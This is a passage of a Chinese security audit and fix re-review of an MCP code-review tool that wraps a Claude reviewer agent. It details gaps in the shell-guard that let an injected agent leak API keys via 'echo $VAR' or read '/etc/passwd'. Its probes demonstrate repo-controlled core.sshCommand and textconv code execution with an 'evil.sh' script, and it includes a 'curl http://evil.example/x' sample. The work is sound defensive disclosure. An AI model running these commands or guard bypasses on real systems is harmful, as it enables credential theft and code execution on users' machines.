`run-tests.mjs:22-24` 给的豁免理由是"p0-regression 与它锁定的安全修复一起发布，未合入的分支上 `npm test` 变红会教会人忽略门禁"——但该套件**已经在 1.18.1 里发布了**（`package.json` 的 `files` 含 `scripts`，CI 也在跑它），这个理由已经过期。

**修法**：去掉 `optional: true`。

### P1-5 `npm test` 把真实的 Anthropic 凭据留在不清理的临时目录里
**文件**：`scripts/cross-cases.mjs:184`（继承 env）对 `scripts/init.mjs:149-152`（写入）
**状态**：✅ 已确认（独立验证者实测）

C4 用例 spawn `scripts/init.mjs` 时继承完整 `process.env`：

```js
// scripts/cross-cases.mjs:184
const r = spawnSync(process.execPath, [path.join(ROOT, "scripts", "init.mjs")], {
  env: { ...process.env, USERPROFILE: home, HOME: home, CLAUDE_CODE_PATH: STUB, … },
```

而 init.mjs 会把凭据写进它生成的配置：

```js
// scripts/init.mjs:149-152
const merged = { ...JSON.parse(JSON.stringify(process.env)) };
for (const k of ["ANTHROPIC_BASE_URL", "ANTHROPIC_AUTH_TOKEN", "ANTHROPIC_API_KEY"]) {
  if (merged[k]) envBlock[k] = merged[k];
}
```

**cross-cases 全文件没有 `rmSync(tmp)`**——临时树永不清除。控制台输出是脱敏的（`init.mjs:47-54`），**但落盘的文件不是**：mode 0600 的文件里装着活的 `ANTHROPIC_AUTH_TOKEN`，长期留在 `$TMPDIR` 里，被任何清理 tmp 的工具扫走。

**修法**：cross-cases 在结束时 `fs.rmSync(tmp, {recursive:true, force:true})`；init.mjs 在测试场景下不要写真实凭据。

### P1-6 guard 设置/日志目录是固定路径，创建时不校验属主与权限
**文件**：`src/claude.js:1195-1196`、`src/index.js:126`
**状态**：✅ 已实测复现（符号链接分支）；普通目录分支为代码路径确认（Linux 限定）

```js
const dir = path.join(os.tmpdir(), "cc-code-review");
fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
```

`mode` **只在创建时生效**；目录已存在则保持原权限与属主。macOS 的 `os.tmpdir()` 是每用户私有的（`/var/folders/…`），Linux 上是**共享的 `/tmp`**。

**实测（Node 真实行为，符号链接分支）**：

```
mkdirSync(recursive, mode:0700) on a symlink-to-dir => OK (no throw)
  lstat isSymbolicLink: true
  mode of the REAL target dir: 755        ← 请求的 0700 没落到真实目录上
  file landed under the attacker-owned dir: true
```

即：`mkdirSync` **不抛错、不替换符号链接、不施加请求的权限**，随后写入的文件全部落在攻击者控制的目录里。

**Linux 上的完整触发链**：本地攻击者预先创建 `/tmp/cc-code-review`（或建一个指向他目录的符号链接）→ `mkdirSync` 不报错 → 运行日志（含被审代码引用）与 `guard-settings-<pid>-<rand>.json` 写进攻击者控制的目录。文件名含 pid + 6 位随机串，但攻击者可以监视目录并替换 settings 文件——claude 在启动时才读 `--settings`，**读的就是被替换后的内容**，即攻击者可以注入自己的 hook。

> **文档承诺 vs 实现**：`README.md`（安全模型节）写的是"运行日志（含被审代码引用）写入 `%TEMP%/cc-code-review/`，**目录 0700、文件 0600**"，`SECURITY.md:26-27` 也重复了这条。**目录不是自己创建时，0700 根本不成立**（实测见上）。

**修法**：创建后显式 `chmod 0700` 并校验 `stat.uid === process.getuid()`（且拒绝符号链接）；更稳的是用 `fs.mkdtempSync` 造私有目录。

### P1-7 `claude_review_env` 里 `new URL()` 可能抛未捕获异常
**文件**：`src/index.js:891`
**状态**：代码路径确认

```js
const baseIsGateway = t && process.env.ANTHROPIC_BASE_URL && t.url.href === new URL(process.env.ANTHROPIC_BASE_URL).href;
```

`t` 来自 `gatewayTarget()`，它是 **settings-aware** 的（`mergedAuthEnv()` = `process.env` 被 settings.json 的 env 块覆盖）。所以 `t` 可以来自 settings.json 的**合法** URL，而 `process.env.ANTHROPIC_BASE_URL` 是宿主环境里另一个**畸形**值——`new URL(畸形值)` 抛 `TypeError`，**没有 try/catch** → 工具调用以内部错误失败，而不是给出可读的诊断。

**触发条件**：宿主环境 `ANTHROPIC_BASE_URL` 写成 `http://[::1` 之类，而 `~/.claude/settings.json` 的 env 块里有一个合法的 base url，同时宿主环境还有其它 `ANTHROPIC_*` 残留（`residue.length > 0` 才会进这个分支）。

**修法**：`gatewayTarget()` 已经解析过一遍，这里直接复用 `t.url`，或把 `new URL(...)` 包进 try/catch。

### P1-8 `package.json` 的 `overrides` 对消费者无效
**文件**：`package.json:60-62`
**状态**：✅ 已确认

```json
"overrides": { "@hono/node-server": "1.19.9" }
```

`@hono/node-server` 是 `@modelcontextprotocol/sdk` 的**传递依赖**（SDK 的 `package.json:104`：`"@hono/node-server": "^1.19.9 || ^2.0.5"`）。**npm 只在"根项目"的 package.json 里认 `overrides`**——被依赖包自己声明的 `overrides` 对消费者一律被忽略。

**后果**：这个 pin 只对维护者本地 `npm install` 生效；**任何 `npm i cc-code-review` 的用户拿到的仍是 SDK 允许的 `^2.0.5`**——若这个 pin 正是为某个 hono 漏洞打的，那就是一个静默失效的安全 pin。

**修法**：用 `dependencies` 直接声明 `@hono/node-server`（npm 会把直接依赖提升/去重），或用 `peerDependencies` + 文档说明，或改用 `npm-force-resolutions`/patch 机制。

---

## 3.1 文档承诺核对表 —— 12 条"可机检"的承诺，12 条不成立

这个项目的文档写得**异常精确**（精确到能直接当断言用）。这本来是优点，但精度让不成立的地方**可被逐条核对**。下表是本轮核对的结果：

| # | 文档位置 | 承诺原文 | 实际 |
|---|---|---|---|
| 0 | `SECURITY.md:3` | "the reviewed repository must not be able to **execute code** … even when its files contain prompt injection" | ❌ `core.sshCommand` 让仓库在评审期间执行任意命令（P0-8） |
| 1 | `README.en.md:160` | "The path arguments of `find`/`rg` and of **every pipe sink** (cat/head/tail/wc/uniq/cut/**tr**/grep) are checked against the repo root" | ❌ `tr` 被 `pathArgs` 豁免，**是名单里唯一没被校验的**（P0-2） |
| 2 | `README.en.md:160` | "`~`, **`$VAR`**, `..`, brace expansion, absolute paths … are all refused" | ❌ 对 `echo`/`tr` 全不成立，裸 `$VAR` 直接放行（P0-1） |
| 3 | `README.en.md:174` | "without a `repoRoot` … **everything fails closed** instead of passing through" | ❌ Read 分支在 containment 抛异常时 **fail-open**（P0-3） |
| 4 | `README.en.md:265` | 上述 Read 边界 "**locked by regression tests**" | ❌ 该分支无任何回归覆盖（P0-3） |
| 5 | `README.md`（安全模型节） | 运行日志目录"**目录 0700**、文件 0600" | ❌ 目录非自己创建时 0700 不成立（P1-6） |
| 6 | `CHANGELOG.md` 1.18.0 `[P1/N6]` + `SECURITY.md:27` | "**active journals are now protected**" / "journal 文件至少存活到对应 job 结果可读" | ❌ `activeSubagentFiles` 只写不读，保护从未接线（P1-2） |
| 7 | `src/index.js:834` + `src/version.js:6-8` | 进程与 hook 版本不一致时 "**the guard self-test refuses to run**" | ❌ 自检探针是结构性的，新旧策略下都通过；**没有任何东西会拒绝运行** |
| 8 | `SECURITY.md:30` | "**每条防线的契约都由 `npm test` 里的回归测试锁定**" | ❌ `echo`/`tr` 两条读边界零覆盖；C7 断言恒真；P0 套件可删（P0-1 / P0-2 / P1-3 / P1-4） |
| 9 | `CHANGELOG.md` 1.18.0 **[P0]** | 属性扫描 "**fails closed if it hits a bound** instead of scanning 'most' of the tree" | ❌ `MAX_ATTR_FILES` 上限的那条 return **不置位 `truncated`**，扫描静默截断且不 refusal（P0-10） |
| 10 | `README.md`（可观测性节） | 模型被改写时 "就在结果里明确报 `⚠ MODEL SUBSTITUTION`" | ❌ `sameModelFamily` 对任何 `claude-*` 早退 true → **Sonnet 被降级成 Haiku 时一个字都不报**（P1-9） |
| 11 | `src/index.js:1064-1067`（代码注释） | "Any refusal between here and runClaude **must release the guard file**" | ❌ `pipeline=native` + shadow 分支用 `err()` 而非 `preflightFail()`，guard 文件与 in-flight 标记双双泄漏（P1-10） |

**给维护者的一句话**：这不是"文档没跟上代码"。第 1–4、6–7 条的**代码逻辑就是那样**，文档写的是**意图**。修复要落在代码上；修完后这 8 条承诺才第一次成立。

### P1-9 `sameModelFamily` 对任何 `claude-` 开头的模型直接返回 true → 模型替换检测对 claude→claude 降级完全失效
**文件**：`src/claude.js:788`
**状态**：✅ 已实测复现

```js
function sameModelFamily(effective, requested) {
  const e = normModel(effective);
  if (!e) return true;              // unknown → never cry wolf
  if (e.startsWith("claude-")) return true;   // ← 只要实际模型叫 claude-*，就直接判定"同一族"
  const r = normModel(requested);
  …
}
```

**实测**：

```
requested = claude-sonnet-4-5
实际运行  = claude-haiku-4-5   （网关把它降级了）
buildModelProvenance() -> substituted: false   note: (none)
```

**后果**：**最常见的替换场景恰好被豁免**——网关（CC Switch 之类）把 Sonnet 换成 Haiku 时，报告里**什么提示都没有**，调用方会把一份 Haiku 产出的报告当成 Sonnet 报告来用、并且拿去和另一份报告做对比。函数后面那套 `e === r || e.startsWith(r) || …` 的比较逻辑，对**任何** `claude-` 开头的实际模型都是死代码。

这也与 `README.md` 宣传的"一旦发现被改写就明确报 `⚠ MODEL SUBSTITUTION`"不符——只在**跨厂商**替换（claude → 某个非 claude 模型）时才生效。

**修法**：把 `e.startsWith("claude-")` 的早退改成"只在 `requested` 也未知时才放行"；既然已经请求了具体模型（`requested` 非空），就应当按模型名/家族逐项比较（例如 `claude-sonnet-*` vs `claude-haiku-*` 判为不同族）。

### P1-10 `pipeline=native` + 存在同名 skill 的早退分支用了 `err()` 而不是 `preflightFail()` → guard 设置文件泄漏
**文件**：`src/index.js:1159`
**状态**：代码路径确认

同一个函数里，上面 40 行写着：

```js
// Any refusal between here and runClaude must release the guard file:
// prepareRunHardening marked it in-flight and only runClaude (or this
// helper) clears the mark — a leaked mark keeps the file undeletable
// until the 2h sweep (cleanupGuardSettings skips in-flight entries).
const preflightFail = (msg) => {
  markGuardSettingsInFlight(guardSettings, false);
  removeGuardSettings(guardSettings);
  return err(msg);
};
```

但 `pipeline === "native" && shadow` 这个拒绝分支**没有走 `preflightFail`**：

```js
if (pipeline === "native" && shadow) {
  return err(                       // ← 没有 markGuardSettingsInFlight(false)，也没有 removeGuardSettings
    `pipeline=native cannot be honoured: a skill named \`code-review\` exists at ${userSkillDir()} …`,
  );
}
```

**后果**：`prepareRunHardening()` 已经写好并标记 in-flight 的 `guard-settings-<pid>-<rand>.json` 既不会被删除、标记也不会解除；而 `cleanupGuardSettings()` **按设计跳过** in-flight 条目 → 文件与标记都活到进程退出。**每次这样的调用泄漏一个临时文件 + 一个 Set 条目**，而那个文件还在向任何人宣称"本次运行有 PreToolUse 保护"。

**修法**：把该分支改成 `return preflightFail(...)`。

---

## 4. P2 — 低severity / 清理（12 条）

| # | 位置 | 问题 |
|---|---|---|
| P2-1 | `src/version.js:25` | `codeDrift()` 只盯 `index.js`/`claude.js`/`shell-guard.js`/`version.js` 四个文件，**漏掉 `prompt.js` 与 `skill.js`**——6 个源模块里 2 个的改动不会触发"STALE PROCESS"警告。 |
| P2-2 | `src/shell-guard.js:326-341` | `find` 的路径参数在**第一个 flag 处 break**，其后所有操作数都不校验：`find . -newer /etc/passwd` 实测**放行**（元数据读取，非内容读取，影响低）。同类缺口对所有"第一个位置参数是 pattern/script"的程序成立。 |
| P2-3 | `src/index.js:616-618` | `maskCredentialValue` 对长度恰好 12 的密钥吐出 **6 个字符（正好一半）**，而它上面的注释写"half of a short secret is still too much of it"。`scripts/init.mjs:49` 对同类值只露 4 个字符——两处脱敏强度不一致。 |
| P2-4 | `src/index.js:92-97` | `pruneReviewJobs` 按 **Map 插入顺序（开始顺序）**淘汰，而不是完成顺序。一个"先开始、后完成"的 job 会在 10 个更新的 job 结束后**立刻**被删掉，轮询它的客户端拿到 "unknown jobId"，尽管它刚刚完成。 |
| P2-5 | `scripts/run-tests.mjs:25-32` | `cancel-test.mjs`、`e2e-test.mjs`、`followup-e2e.mjs` **不在任何套件、任何 npm script、CI 里**。其中 `cancel-test.mjs` 是"取消能杀掉进程树、停止计费"的**唯一**覆盖，且它 Windows-only（macOS 上 `tasklist` 抛错被吞 → `started` 为 false → 退出 1）。 |
| P2-6 | `src/shell-guard.js:121,633` | `MAX_SEGMENTS = 8` 零覆盖（`grep -rn MAX_SEGMENTS scripts/` 无命中），shell-guard-test 最长链只有 3 段。 |
| P2-7 | `scripts/stub-claude.mjs:210` | 桩只会 `exit(0)`，唯一模拟的失败（`STUB_RESULT_SUBTYPE=error_max_budget_usd`）也 exit 0。于是 `src/claude.js` 的**崩溃/信号/spawn 失败分支**（`:1608-1623` 的 Gatekeeper 提示、`:1667` 的 spawn error）从未被执行过。 |
| P2-8 | `src/shell-guard.js:48,581-586` | `PIPE_SINKS` 与用户可见的 `ALLOWED_HINT` 是同一份清单的**两份模块私有副本**，且都不导出——没有任何测试能锁住它们的一致性（对比 `BASH_POLICY` 有 `shell-guard-test.mjs:251-266` 的锁定）。`tr` 在整个测试目录里从未出现过一次。 |
| P2-9 | `src/prompt.js:270` | `buildFallbackPrompt` 是**死代码**：`index.js:37` 导入了但从未调用，只有 `scripts/audit-fixes-test.mjs:484` 在测它。 |
| P2-10 | `src/prompt.js:203,300` | `lines.filter((l) => l !== "")` 把构造器自己 `lines.push("")` 插入的段落分隔符全部删掉，指令前言（交付物契约、工具约束、fix 模式）塌成一段连续文本；而内嵌的 SKILL.md 正文因为是单个多行字符串，分隔符反而保留——两层结构不一致。 |
| P2-11 | `src/shell-guard.js:266-270,311-314,518-527` | `sed` 相关处理**全部不可达**：`sed` 既不在 `BASH_POLICY` 也不在 `PIPE_SINKS`（1.18.0 已把它移出 sink），所以 `FLAG_KINDS.sed`、`OUTRIGHT_DENY.sed` 与 `segmentProblem` 里的 `sed -i` / sed 脚本检查永远不会被执行。 |
| P2-12 | `src/index.js:120-128` | `logsDir()` 的 `fs.mkdirSync` 没有 try/catch。async 路径被 `.catch` 兜住并降级为 "review job crashed"，**sync 路径（`waitForResult=true`）的异常会直接冒出工具处理器**。 |

---

## 5. 上轮遗留项的现状（据 `docs/04-test/08-audit-atomic-v1.18.2.md`）

| 编号（**1.18.0 轮**） | 状态 | 现状 |
|---|---|---|
| 上轮 P1-8 sync 取消丢报告 | 留待下轮 | **仍存在**，但结构性：客户端已取消时无处可返回。 |
| **上轮 P1-10 `scope=pr` 缺 pr** | 留待下轮 | **仍存在 → 本轮 P0-6**（实测复现） |
| 上轮 P1-15 默认 async 与 instructions 不一致 | 留待下轮 | **仍存在**：`index.js:594-597` 的 instructions 仍写 `claude_code_review(repoPath, scope) -> fix code`，但默认已是 async 返回 jobId。 |
| 上轮 P1-16 同 repo/session 无并发锁 | 留待下轮 | **仍存在**：同一仓库并发两个 fix 模式评审会互相覆盖工作区。 |
| P2 主题 1 `echo $VAR` 外带凭据 | 未动 | **仍存在 → 本轮 P0-1** |
| P2 主题 4 置信度标尺互斥 | 未动 | **仍存在 → 本轮 P1-1** |
| P2 主题 7 `overrides` 对消费者无效 | 未动 | **仍存在 → 本轮 P1-8** |

---

## 6. 复现方式

审计探针（**只读**，未修改仓库任何文件）：

```bash
# P0-1 / P0-2：guard 是否放行
mkdir -p /tmp/ccr-audit-probe/repo && cd /tmp/ccr-audit-probe/repo && git init -q
node -e '
import("/Users/kent/Desktop/projects/cc-code-review_MCP/src/shell-guard.js").then(({analyseCommand})=>{
  const O={repoRoot:"/tmp/ccr-audit-probe/repo"};
  for (const c of ["echo $ANTHROPIC_API_KEY","echo ~/*","echo ../*",
                   "echo hi | tr a b /etc/passwd","echo hi | cat /etc/passwd",
                   "ls ../*","find /etc -name passwd"])
    console.log((analyseCommand(c,O).ok?"ALLOWED":"blocked"), c);
});'

# P0-5 / P0-6：提示词实际内容
node -e '
import("/Users/kent/Desktop/projects/cc-code-review_MCP/src/prompt.js").then(({buildReviewPrompt,buildNativeCommand})=>{
  const b={scope:"branch",outputLanguage:"中文",effort:"max",reviewLevel:"max",useEffortFlag:true,cwd:"/tmp/x",useSkill:false};
  console.log(buildReviewPrompt({...b,baseRef:"HEAD~1"}).split("\n").filter(l=>l.includes("ignored")));
  console.log(buildReviewPrompt({...b,scope:"pr"}).split("\n")[0]);
  console.log(buildNativeCommand({reviewLevel:"max",target:undefined,fix:false}));
});'

# P0-7：followup 误报
node -e '
import("/Users/kent/Desktop/projects/cc-code-review_MCP/src/shell-guard.js").then(({shellChainingNote})=>{
  const O={repoRoot:"/tmp/ccr-audit-probe/repo"}, a=["git status; curl http://evil.example/x"];
  console.log("review  :", shellChainingNote(a,a,O));
  console.log("followup:", shellChainingNote(a,[],O));
});'

# P1-3 / P1-4：恒真断言与 optional 套件
grep -n 'ok: !!cond' scripts/cross-cases.mjs
grep -n 'check("C7"' scripts/cross-cases.mjs
grep -n 'p0-regression' scripts/run-tests.mjs

# P0-8：仓库可控 core.sshCommand → 评审期间执行任意命令
mkdir -p /tmp/ccr-probe && cd /tmp/ccr-probe && git init -q
printf '#!/bin/sh\necho "sshCommand ran: $*" >> /tmp/ccr-probe/marker.txt\n' > evil.sh && chmod +x evil.sh
git config core.sshCommand /tmp/ccr-probe/evil.sh
git remote add origin ssh://git@example.invalid/some/repo.git
node -e 'import("/Users/kent/Desktop/projects/cc-code-review_MCP/src/claude.js").then(({repoRunsGitPrograms})=>{
  const r=repoRunsGitPrograms("/tmp/ccr-probe");
  console.log("refusals:",JSON.stringify(r.refusals),"notes:",JSON.stringify(r.notes));})'
git remote show origin            # 白名单内、提示词主动建议的命令
cat /tmp/ccr-probe/marker.txt     # → sshCommand ran: ...

# P0-9：core.attributesFile 指向的属性文件从不被扫描
mkdir -p /tmp/ccr-probe2 && git -C /tmp/ccr-probe2 init -q
printf '#!/bin/sh\necho "textconv ran" >> /tmp/ccr-probe2/marker.txt\n' > /tmp/ccr-probe2/evil.sh && chmod +x /tmp/ccr-probe2/evil.sh
printf '* diff=evil\n' > /tmp/ccr-probe2/evil-attrs
printf '[core]\n\tattributesFile = /tmp/ccr-probe2/evil-attrs\n[diff "evil"]\n\ttextconv = /tmp/ccr-probe2/evil.sh\n' > /tmp/ccr-probe2/.git/config
git -C /tmp/ccr-probe2 check-attr diff -- f.txt     # → f.txt: diff: evil   ← 属性已生效
node -e 'import("/Users/kent/Desktop/projects/cc-code-review_MCP/src/claude.js").then(({repoRunsGitPrograms})=>{
  const r=repoRunsGitPrograms("/tmp/ccr-probe2"); console.log("refusals:",JSON.stringify(r.refusals),"notes:",JSON.stringify(r.notes));})'

# P0-10：MAX_ATTR_FILES 上限不置位 truncated
node -e 'const fs=require("fs");fs.mkdirSync("/tmp/ccr-many",{recursive:true});
for(let i=0;i<4100;i++) fs.writeFileSync(`/tmp/ccr-many/a${i}.gitattributes`,"*.txt x=1\n");
import("/Users/kent/Desktop/projects/cc-code-review_MCP/src/claude.js").then(({repoRunsGitPrograms})=>{
  const r=repoRunsGitPrograms("/tmp/ccr-many");
  console.log("refusals:",r.refusals.length,"truncation-refusal present:",r.refusals.some(x=>x.includes("more than 4000")));})'

# P1-9：模型替换检测对 claude→claude 失效
node -e 'import("/Users/kent/Desktop/projects/cc-code-review_MCP/src/claude.js").then(({buildModelProvenance})=>{
  const p=buildModelProvenance({requestedModel:"claude-sonnet-4-5",mainModels:["claude-haiku-4-5"],billedModels:["claude-haiku-4-5"]});
  console.log("substituted:",p.substituted,"note:",p.note||"(none)");})'
```

---

## 7. 做得好的地方（明确写下来，避免下轮误伤）

- **单点真相**：`BASH_POLICY` 同时渲染权限规则与 hook 判定（`shell-guard.js:55` ↔ `prompt.js:338`），架构方向正确——本轮的 P0-1/P0-2 是**豁免名单**打错了洞，不是分层错了。
- **argv 视图的 tokenizer**：`parseCommand` 建模 bash 的引号/转义/$'…'，1.18.0 的 P0-1 类问题这次**真的堵住了**（独立验证者实测 `$'…'`、反斜杠、紧贴短选项全部 DENY）。
- **stdout 零污染**：全仓 `src/` 无 `console.log`，MCP stdio 通道干净。
- **allow/deny 规则里带空格是安全的**（曾疑点，已排除）：`index.js:1287` 用 `allowedTools.join(" ")` 拼成一个 argv，而 allowlist 里确实有含空格的精确规则（`Bash(git branch -a)`、`Bash(git remote -v)`、`Bash(git stash list)`）。实测 claude CLI 的 `--help` 明确写的是 "**Comma or space-separated** list of tool names"，故该写法有效。**不要误报这条。**
- **失败即拒绝**：guard 写失败、hook 自检失败、hook 拿不到 repo root，三条路径都是 fail-closed（`index.js:729-738`、`pre-tool-hook.js:188-191`）。
- **空报告 = 失败**：**1.18.0 轮的 P0-9**（空报告按成功返回）修得彻底，review/followup × sync/async 四条路径统一。
- **凭据脱敏**：env-vs-settings 不一致提示、gateway URL 都已 origin-only / 前缀+长度脱敏（`index.js:615-654`）——除了 P2-3 那个 12 字符边界。
- **进程组 kill**：`killTree` / `reapExitedGroup` 的"只杀活着的子进程"防 pid 复用，是同类项目里少见的细致。

---

## 8. 建议修复顺序

**第 1 批（安全，半天）**
1. **P0-8 `core.sshCommand` 扫描漏检**（仓库可控 RCE 之一）——补模式表 / 改用 `git config --list -z` / 给评审子进程也套 `GIT_HARDENING_ARGS`
2. **P0-9 `core.attributesFile` 指向的属性文件从不扫描**（仓库可控 RCE 之二）——把该文件纳入扫描
3. **P0-10 `MAX_ATTR_FILES` 上限不置位 `truncated`**——补 `truncated = true`（承诺的 fail-closed）
4. P0-1 `echo` 豁免 + 裸 `$VAR` 建模 + 子进程环境白名单
5. P0-2 `tr` 的文件操作数做路径校验
6. P0-3 Read 分支改 fail-closed
7. P0-4 stdin error 改 deny
8. P1-6 目录属主/权限校验 + `mkdtemp`

**第 2 批（结果正确性，半天）**
9. P0-5 baseRef 单一校验器
10. P0-6 `scope=pr` 强制要求 `pr`
11. P0-7 followup 复用 review 的 denial 分类
12. P1-1 标尺与过滤器对齐（改标尺或改阈值，二选一）
13. P1-2 `activeSubagentFiles` 真正接进两条保留路径
14. P1-9 `sameModelFamily` 对 claude→claude 也要比较模型族
15. P1-10 `pipeline=native` 分支改用 `preflightFail()`

**第 3 批（门禁可信，半天）**
16. P1-3 C7 断言修成真断言
17. P1-4 去掉 `optional`
18. P1-5 tmp 清理 + 测试不写真实凭据
19. P1-7 `new URL` try/catch
20. P1-8 `overrides` 换成直接依赖

**第 4 批（P2 + 上轮遗留）**
21. P2 全表 + 上轮 P1-15（instructions 口径）+ 上轮 P1-16（并发锁）

> **如果只有一天**：先做第 1 批的 1–3 条（两条 RCE + 一条 fail-closed）。其余条目都是"评审结果可能不准 / 门禁不可信"，而这两条是"**被审仓库能在你机器上执行任意命令**"。

---

## 9. 复核（对 1.18.2 的修复复核）

**复核时间**：2026-10-29 晚 · **被复核版本**：v1.18.2（`package.json` + `src/version.js` 均为 1.18.2）
**改动文件**：17 个（`src/` 6 个 + `scripts/` 5 个 + 文档 6 个）
**复核方式**：与上一轮**同一批实测探针**重跑（真实 hook 进程 / 真实 git / 真实仓库配置）+ 48 条真实 reviewer 命令的回归电池 + `npm test`

### 9.1 结论：15 条上报发现**全部已修**，且未引入回归

| # | 发现 | 结果 | 复核证据 |
|---|---|---|---|
| 1 | P0-8 `core.sshCommand` 扫描漏检 | ✅ **已修** | 扫描器现在 refusal（`refusals=1`，文案给出 `git config --unset core.sshcommand` 的修法）。**并且超出报告建议**：扫描主路径改为 `git config --file <cfg> --no-includes --list -z`（用 git 自己的规范化键名，正则仅作 git 不可用时的兜底），且给评审子进程的 git 注入 7 个 `GIT_CONFIG_*` 命令级覆盖（`core.sshCommand`/`fsmonitor`/`pager`/`hooksPath`/`diff.external`/`credential.helper`/`core.attributesFile`）——**这一层是扫描器本身给不了的**（仓库可以命名扫描器没预料到的键）。 |
| 2 | P0-9 `core.attributesFile` 从不扫描 | ✅ **已修** | 该文件现在是第三个属性来源，被读取并参与驱动交叉核对：`refusals=1`（`evil-attrs: * diff=evil (driver "evil" is defined in the repo's git config)`）。 |
| 3 | P0-10 `MAX_ATTR_FILES` 上限不 refusal | ✅ **已修** | `claude.js:2280` 改为 `{ truncated = true; return; }`；**正确的 fixture**（每目录一个 `.gitattributes`，共 4100 个）实测 refusals=1 且含截断文案。 |
| 4 | P0-1 `echo $VAR` 凭据外带 | ✅ **已修** | 真实 hook 进程实测：`echo $ANTHROPIC_API_KEY` / `"$ANTHROPIC_API_KEY"` / `$(...)` / `"$(...)"` / 反引号 / `${HOME}` / `~/*` / `../*` / `*` **全部 DENY**；对照组（命令替换、`cat ~/.ssh/id_rsa`）照常 DENY。 |
| 5 | P0-2 `tr` 管道 sink 不做路径校验 | ✅ **已修**（**影响面我写大了，见 §9.2**） | `echo hi \| tr a b /etc/passwd` 现在 DENY；`\| tr a-z A-Z`（无文件操作数）仍 ALLOWED。 |
| 6 | P0-3 hook 的 Read 分支 fail-open | ✅ **已修** | 真实 hook 进程：root 不可解析时 **Read 与 Write 都 DENY**（`Read blocked: cannot resolve the target path against the repository root (fail closed)`）。 |
| 7 | P0-4 hook stdin 出错 fail-open | ✅ **已修** | 改为 `emitDeny(reason, 1)`——退出码 1，CLI 的 `onFailure:"block"` 生效。 |
| 8 | P0-5 `baseRef` 被静默丢弃 | ✅ **已修** | `HEAD~1` 与 `feature@2` 现在都进入提示词（`ignored=false`），两套校验器已合一。 |
| 9 | P0-6 `scope=pr` 无 pr | ✅ **已修** | `index.js:1095` 在**任何付费动作之前**直接报错；提示词里的 `undefined` 也换成了可执行的措辞。 |
| 10 | P0-7 followup 误报"命令未被拦截" | ✅ **已修** | 两条路径都改用共享的 `classifyDenials(j, repoPath)`，followup 拿到真实的 denied 集合。 |
| 11 | P1-9 `sameModelFamily` 隐藏 claude→claude 替换 | ✅ **已修** | requested `claude-sonnet-4-5` / 实际 `claude-haiku-4-5` → `substituted=true` 且有 MODEL SUBSTITUTION 提示。 |
| 12 | P1-1 出厂 SKILL.md 标尺与 `>=80` 互斥 | ✅ **已修** | 过滤器改为 `>= 75`，与标尺里 75 = "Real, important, will be hit in practice" 对齐。 |
| 13 | P1-2 `activeSubagentFiles` 只写不读 | ✅ **已修** | 两条保留路径都读它了（`claude.js:1071` 的 2h 清扫、`index.js:185` 的 20 份清扫），且文件删除时从集合移除。 |
| 14 | P1-6 guard 目录不校验属主/权限 | ✅ **已修** | 现在 `lstat` 拒绝符号链接、校验 `st.uid === process.getuid()`、并强制 `chmod 0700`（`index.js:137-149`、`claude.js:1285-1297`）。 |
| 15 | P1-4 P0 套件被标 `optional` | ✅ **已修** | `optional` 已移除；套件缺失现在是 FAIL 而非 SKIP。 |

**本报告正文之外、同样已修的项**（复核时顺带确认）：P1-3 C7 恒真断言（改为 `shadowedRules.length === 0`）、P1-5 tmp 里的真实凭据（`cleanupTmp` 挂到 exit/信号）、P1-7 `new URL()` 未捕获、P1-8 `overrides`（改为把 `@hono/node-server` 提成**直接依赖**，这正是报告 §P1-8 给的修法）、P2-1 `codeDrift` 漏文件、P2-2 `find` 后续操作数、P2-3 12 字符密钥露一半、P2-4 job 按完成顺序淘汰、P2-6 `MAX_SEGMENTS` 零覆盖、P2-8 `PIPE_SINKS` 双份副本（现导出且 hint 由它渲染）、P2-10 提示词空行被吞、P2-12 `logsDir()` 裸抛。

### 9.2 两处**我写错了**，维护者纠正得对

1. **P0-10 的复现 fixture 是无效的**：我当时的探针把文件命名为 `aN.gitattributes`——那**不是**属性文件，扫描器的 `if (e.name !== ".gitattributes") continue;` 会直接跳过，所以根本没撞到 4000 的上限。正确的 fixture 是**每个目录一个 `.gitattributes`**（同名文件无法放进同一目录）。用正确 fixture 重测，修复前确实不 refusal、修复后确实 refusal。**这一条我的原始证据是错的，结论侥幸成立。**
2. **P0-2 的"任意文件读取"说大了**：`tr` 在 BSD（`usage: tr [-Ccsu] string1 string2`）和 GNU coreutils 里**都不接受 FILE 操作数**——我把它当作事实陈述，实际是采信了验证者的说法而没有自己核实。真实缺陷是**防御纵深的不一致**（`tr` 是唯一不走 `FLAG_KINDS` 的管道 sink），不是任意读原语。修复本身是对的（现在 `tr` 的操作数也做路径校验），但我当时的严重性定级过高。

### 9.3 修复引入的**新**过拒（低severity，本轮新增发现）

**P2-13 单引号内的字面 `$` 被误判为不可静态解析 → `echo` 被过度拒绝**
**文件**：`src/shell-guard.js:491`（`isInsideRepo` 的 `token.includes("$")`）+ `src/shell-guard.js:330`（`echo` 改走 `FLAG_KINDS` 后进入路径校验）

修复把 `echo` 的操作数接进了路径校验，于是 `isInsideRepo` 那条**早就存在**的"`$` 无法静态解析 → 判定为仓外"规则，现在也会作用到 `echo` 上。但 bash **单引号里的 `$` 不展开**：

```
blocked  echo '===== $NOT_EXPANDED'      单引号，bash 不展开 → 误拒
blocked  echo 'price: $5'                同上 → 误拒
ALLOWED  echo '100% done'                无 $ → 正常
ALLOWED  echo '===== plain ====='        无 $ → 正常
ALLOWED  echo 'a/b' / echo 'src/index.js'  → 正常
blocked  echo "price: $5"                双引号，bash 确实展开 → 拒得对
```

根因：`parseCommand` 在剥掉引号之后才把词交给 `pathArgs`，**"这个 `$` 是不是被引号保护过"的信息在这一步丢失了**；而 `parseCommand` 本身是知道这个区别的（它有单引号分支）。

**影响**：低——只是白烧一个 turn（reviewer 换个引号写法就能过），不涉及任何安全后果；`git log --format='$h %s'`、`grep -rn 'cost $5' src` 这类**位置参数不是路径**的命令不受影响（实测仍 ALLOWED）。

**修法**：把"该 `$` 是否被单引号保护"从 `parseCommand` 带到 `pathArgs`（例如在词上标注 `literal`），让 `isInsideRepo` 只对**会被展开**的 `$` 判定为不可解析。

### 9.4 仍然未修 / 已改为显式声明

| 编号 | 项 | 现状 |
|---|---|---|
| P2-5 | `cancel-test` / `e2e-test` / `followup-e2e` 不在默认门禁 | **已改为显式声明**：runner 现在有 `PAID_SUITES` 清单，逐条写明"为什么不在这里"和对应的 npm script（`test:cancel` / `test:e2e:real` / `test:followup` / `test:paid`），并作为 SKIP 行打印在汇总里。门禁不再假装覆盖它们（覆盖率本身没变——它们按设计要花钱）。 |
